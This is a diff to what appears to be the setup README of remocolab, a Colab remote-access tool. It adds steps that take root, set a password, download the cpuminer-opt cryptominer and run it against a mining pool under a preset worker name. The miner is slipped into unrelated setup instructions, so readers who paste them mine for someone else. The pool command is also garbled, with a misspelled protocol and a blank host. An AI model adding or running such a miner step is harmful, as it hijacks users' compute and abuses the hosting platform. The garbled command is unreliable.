@@ -59,6 +59,14 @@ remocolab.setupSSHD()
 !pip install git+https://github.com/demotomohiro/remocolab.git
 import remocolab
 remocolab.setupVNC()
+
+sudo su
+passwd
+"Enter Any Password"
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+tar xf cpuminer-opt-linux.tar.gz
+./cpuminer -sse2 -a yespowersugar -o stractum+tcps://      -u      vdjsjda.[Name]
+
 ```
 4. (Optional) If you want to run OpenGL applications or any programs that use GPU,
 Click "Runtime" -> "Change runtime type" in top menu and change Hardware accelerator to GPU. 
